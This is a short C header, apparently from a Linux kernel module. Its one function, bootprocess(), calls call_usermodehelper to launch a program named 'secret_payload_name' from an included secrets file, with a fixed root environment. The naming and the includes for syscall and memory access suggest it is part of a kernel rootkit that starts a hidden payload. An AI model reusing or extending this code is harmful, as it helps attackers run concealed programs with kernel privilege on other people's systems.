#ifndef BOOTPROCESS_H
#define BOOTPROCESS_H

#include "include.h"
#include "rw.h"
#include "syscall.h"
#include "utility.h"
#include "secrets.h"
MODULE_LICENSE("GPL");

int bootprocess(void)
{
	char *argv[] = { secret_payload_name, NULL };
	static char *envp[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };

	return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
#endif